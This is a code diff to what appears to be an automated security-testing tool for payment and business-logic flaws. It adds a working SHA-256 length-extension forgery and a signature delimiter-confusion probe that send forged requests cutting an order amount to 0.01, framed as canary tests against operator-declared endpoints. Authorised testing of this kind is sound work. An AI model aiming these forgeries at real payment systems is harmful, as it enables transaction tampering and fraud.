@@ -22,8 +22,10 @@ Usage:
 from __future__ import annotations
 
 import argparse
+import hashlib
 import json
 import re
+import struct
 import sys
 import time
 import urllib.error
@@ -1180,6 +1182,165 @@ def _fin_currency(base: str, surface: str, baseline: Optional[Dict]
     return False, ""
 
 
+# SHA-256 length-extension building blocks (FIN-CRYPTO-01).  A MAC built as
+# SHA256(secret || data) leaks its chaining state in the digest itself: an
+# attacker holding a valid (data, tag) pair can compute SHA256(secret ||
+# data || glue || suffix) WITHOUT knowing the secret.  The suffix's
+# length-extension appended block is the proof.  Deterministic -- pure
+# hashlib, no model calls, no payload beyond the canary amount mutation.
+
+def _sha256_with_state(state_words: Tuple[int, ...], message: bytes,
+                       *, bit_offset: int = 0) -> bytes:
+    """SHA-256 compression over ``message`` starting from ``state_words``.
+
+    Re-implements the FIPS 180-4 compression function (hashlib cannot seed
+    a chaining state).  ``bit_offset`` is the bit length ALREADY absorbed
+    into ``state_words`` (length extension: secret+data+glue) -- the
+    padding appended here encodes the TOTAL stream length, which is what
+    makes a continued digest a real SHA-256 over the whole stream.
+    """
+    if len(state_words) != 8:
+        raise ValueError("state must be 8 uint32 words")
+    # --- FIPS 180-4 constants -------------------------------------------------
+    K = [0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b,
+         0x59f111f1, 0x923f82a4, 0xab1c5ed5, 0xd807aa98, 0x12835b01,
+         0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7,
+         0xc19bf174, 0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc,
+         0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da, 0x983e5152,
+         0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147,
+         0x06ca6351, 0x14292967, 0x27b70a85, 0x2e1b2138, 0x4d2c6dfc,
+         0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
+         0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819,
+         0xd6990624, 0xf40e3585, 0x106aa070, 0x19a4c116, 0x1e376c08,
+         0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f,
+         0x682e6ff3, 0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,
+         0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2]
+    H = list(state_words)
+    mask = 0xffffffff
+
+    def _rotr(x: int, n: int) -> int:
+        return ((x >> n) | (x << (32 - n))) & mask
+
+    # Pad for a stream whose already-absorbed prefix is ``bit_offset`` bits:
+    # total length field = bit_offset + len(message) * 8.
+    msg = bytearray(message)
+    bit_len = bit_offset + len(message) * 8
+    msg.append(0x80)
+    while (bit_offset // 8 + len(msg)) % 64 != 56:
+        msg.append(0x00)
+    msg += bit_len.to_bytes(8, "big")
+
+    for off in range(0, len(msg), 64):
+        w = list(struct.unpack(">16I", bytes(msg[off:off + 64])))
+        for t in range(16, 64):
+            s0 = _rotr(w[t - 15], 7) ^ _rotr(w[t - 15], 18) \
+                ^ (w[t - 15] >> 3)
+            s1 = _rotr(w[t - 2], 17) ^ _rotr(w[t - 2], 19) \
+                ^ (w[t - 2] >> 10)
+            w.append((w[t - 16] + s0 + w[t - 7] + s1) & mask)
+        a, b, c, d, e, f, g, h = H
+        for t in range(64):
+            S1 = _rotr(e, 6) ^ _rotr(e, 11) ^ _rotr(e, 25)
+            ch = (e & f) ^ ((~e & mask) & g)
+            t1 = (h + S1 + K[t] + w[t] + ch) & mask
+            S0 = _rotr(a, 2) ^ _rotr(a, 13) ^ _rotr(a, 22)
+            maj = (a & b) ^ (a & c) ^ (b & c)
+            t2 = (S0 + maj) & mask
+            h, g, f, e = g, f, e, (d + t1) & mask
+            d, c, b, a = c, b, a, (t1 + t2) & mask
+        H = [(x + y) & mask for x, y in zip(H, [a, b, c, d, e, f, g, h])]
+    return struct.pack(">8I", *H)
+
+
+def _sha256_padding(msg_len: int) -> bytes:
+    """Standard SHA-256 padding for a message of ``msg_len`` bytes.
+
+    The trailing 64-bit field encodes the MESSAGE length (msg_len * 8),
+    never the padded length -- the classic length-extension pitfall.
+    """
+    pad = bytearray(b"\x80")
+    while (msg_len + len(pad)) % 64 != 56:
+        pad.append(0x00)
+    return bytes(pad) + (msg_len * 8).to_bytes(8, "big")
+
+
+def _length_extend(original_data: bytes, original_digest: bytes,
+                   suffix: bytes, secret_len: int) -> Tuple[bytes, bytes]:
+    """Return (extension_request, expected_digest) for a length extension
+    over SHA256(secret || original_data) with guessed secret length."""
+    base_len = secret_len + len(original_data)
+    glue = _sha256_padding(base_len)
+    state = struct.unpack(">8I", original_digest)
+    # Continue from the leaked state over glue+suffix; the continuation's
+    # length field must count the absorbed prefix (base_len + glue).
+    absorbed = base_len + len(glue)
+    new_digest = _sha256_with_state(
+        state, suffix, bit_offset=absorbed * 8)
+    return original_data + glue + suffix, new_digest
+
+
+def _fin_signature(base: str, surface: str, baseline: Optional[Dict]
+                   ) -> Tuple[bool, str]:
+    """FIN-CRYPTO-01/02: signature-construction forgery (deterministic).
+
+    Canary stage: one (params, sig) pair from the operator-declared sign
+    flow -- no secret is recovered or used.  Then:
+
+    * FIN-CRYPTO-01 length extension: if the MAC is SHA256(secret ||
+      params), a glue-padded continuation carrying ``amount=0.01``
+      verifies without the secret.  Pure-hashlib proof; the sweep is
+      bounded (1..32) per the plan's nested work-unit budget.
+    * FIN-CRYPTO-02 delimiter confusion: a params string embedding a
+      sig-shaped suffix may re-parse into a different (params, sig) split
+      that still verifies.
+
+    Safety ceiling: the proof is a verified canary-amount mutation
+    (0.01) -- no secret extraction, no data beyond the owned canary.
+    """
+    canary_params = {"order_id": "ord-crypto-1", "amount": 100}
+    signed = _fin_post(base, surface.replace("verify", "sign"),
+                       dict(canary_params))
+    pair = _fin_json(signed)
+    if not (signed.ok and isinstance(pair, dict) and pair.get("sig")):
+        return False, ""
+    params_str = str(pair.get("params") or
+                     "".join(f"{k}={canary_params[k]};"
+                             for k in sorted(canary_params)))
+    sig = str(pair["sig"])
+
+    # --- FIN-CRYPTO-01: length extension over the leaked chaining state ----
+    try:
+        for secret_len in range(1, 33):
+            request, expected = _length_extend(
+                params_str.encode(), bytes.fromhex(sig),
+                b"amount=0.01;", secret_len)
+            # Send the extended request: the verifier will hash
+            # secret || request and compare against a sig WE supply.  The
+            # verifier recomputes over the RAW params it parses -- so we
+            # send the glued bytes verbatim and our computed digest.
+            ext = _fin_post(base, surface, {
+                "raw": request.decode("latin-1"), "sig": expected.hex()})
+            if ext.ok and (_fin_json(ext) or {}).get("verified"):
+                return True, (f"length extension verified without the secret "
+                              f"(secret length {secret_len}; FIN-CRYPTO-01: "
+                              "MAC is SHA256(secret || data))")
+    except Exception:  # noqa: BLE001 - crypto probe failure is data
+        pass
+
+    # --- FIN-CRYPTO-02: delimiter confusion --------------------------------
+    # The canonicalization is sorted(k=v;).  If the verifier splits on the
+    # LAST ';='-adjacent sig field (or accepts sig inside params), a params
+    # string that CONTAINS a sig-like suffix may verify as a different split.
+    confused = params_str + "sig=" + sig + ";"
+    probe2 = _fin_post(base, surface, {
+        "raw": confused, "sig": sig})
+    if probe2.ok and (_fin_json(probe2) or {}).get("verified"):
+        return True, ("concatenated-signature delimiter confusion: a params "
+                      "string embedding the sig verifies as a different "
+                      "(params, sig) split (FIN-CRYPTO-02)")
+    return False, ""
+
+
 # FIN technique -> prober.  Registry order = R2 exhaustion order; each prober
 # returns (success, differential detail).  Deterministic tier: zero model calls.
 FIN_TECHNIQUES: Dict[str, Callable[[str, str, Optional[Dict]], Tuple[bool, str]]] = {
@@ -1193,6 +1354,7 @@ FIN_TECHNIQUES: Dict[str, Callable[[str, str, Optional[Dict]], Tuple[bool, str]]
     "price-trust": _fin_price_trust,
     "test-gateway-forcing": _fin_test_gateway,
     "format-mutation-matrix": _fin_format_matrix,
+    "signature-forgery": _fin_signature,
 }
 
 # technique -> the registry entry families it exercises (configs/fin_logic.json).
@@ -1207,6 +1369,7 @@ FIN_TECHNIQUE_REGISTRY_PREFIX = {
     "price-trust": ("FIN-PARAM",),
     "test-gateway-forcing": ("FIN-TESTDATA",),
     "format-mutation-matrix": ("FIN-NUM",),
+    "signature-forgery": ("FIN-CRYPTO",),
 }
 
 # FIN technique set == TECHNIQUE_MATRIX["business_logic"] (asserted by tests)
